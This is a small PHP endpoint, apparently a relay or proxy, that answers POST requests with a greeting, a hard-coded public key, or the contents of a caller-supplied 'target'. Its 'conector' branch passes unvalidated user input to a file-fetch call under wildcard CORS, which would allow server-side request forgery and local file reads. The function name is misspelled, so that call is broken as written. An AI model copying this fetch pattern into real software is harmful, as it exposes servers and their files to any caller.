<?php
header('Access-Control-Allow-Origin: *');  
header("Content-type: application/json");

if (isset($_POST["type"])) {
    if ($_POST["type"] == "Hi!") {
        echo '{ "status": "200", "message": "Hey there!" }';
    }
    if ($_POST["type"] == "public_key") {
        if (isset($_POST["target"]) && isset($_POST["sess_id"])) {
            //echo file_get_contents($_POST["target"] . "?id=" . $_POST["sess_id"]);
            echo '{ "status": 200, "public_key": "MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAiUJt8MkbQArcRHet8KF2lEJu0v/kt9c2KPoiFBVIsAz2soS7L/crWc3Slm3mVAf0rS4kMU7RSLXG24A5YfGZx3JxTH5tB8/u6zjR3ieqcHaHQ5ho0mu52YWgfk6NbDhr5ztgTxA+KoMKqdC25/VouFfN5iOGWChtsW/iQvQmTzAbgq4m8sU0k4+Gz8fTdQUR6Ln1qU0NalwqjQH8mT9nML1fjyZTApfhCBSprTF2qRAhE8hlES2yJhQx2UF95Vybx8Y5PjHMO5uJlXTNBGDCuf/CaS+Z22Ju/9/6r679aqGPlEZgfNRFIkczgfjoNrSDShYyWXceg7GXBOzTuA3W4QUiD+tnGObI9kcdH29NLKQzzXXe1HhVQIfrzQ7u5fXGkw0wngadNc8XukZkz4Io37Ijz6cWOKTt5AI/UK3u6jl9Um4E7ncmdXrJFhTXT63tMVv53iu2ZIKajX7hqcH/UX7SHXHz49S8iICwauSThmWtIrCqV5S5PP+Vq1uFxU9O3+tQcTfT0G/SGMhckcgK6sQFbz+9BAGrKLnjCAP+wjPOQcnIJj9RExOONgDDGn8cD3PcnBKt1XGDw5EBMoA9lIJyqHl4CNHeylkMNsUEXRKUl7bSW7UpfnhmuP7WHa1klxMzSac8afa7ljkkaPFusYvNkZW9o6em3SfsbiXE6m8CAwEAAQ==" }';
        }
    }
    if ($_POST["type"] == "conector") {
        if (isset($_POST["target"]) && isset($_POST["magic"]) && isset($_POST["sess_id"])) {
            echo file_get_conents($_POST["target"]);
        }
    }
} else {
    echo '{ "stauts": 403 }';
}

?>